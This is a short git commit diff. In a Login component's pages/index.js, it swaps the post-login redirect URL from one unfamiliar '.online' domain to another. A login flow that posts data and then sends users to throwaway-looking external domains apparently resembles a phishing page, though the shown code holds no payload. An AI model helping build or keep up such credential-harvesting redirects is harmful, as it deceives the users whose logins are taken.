74845bb27732d5c776fdd36159fd793b5ecd15d0
hurt the kid <127146284+husknet@users.noreply.github.com>
2025-07-03 10:01:30 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://scn.drodge-webview.online/';
+      window.location.href = 'https://scn.awillynilly.online/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
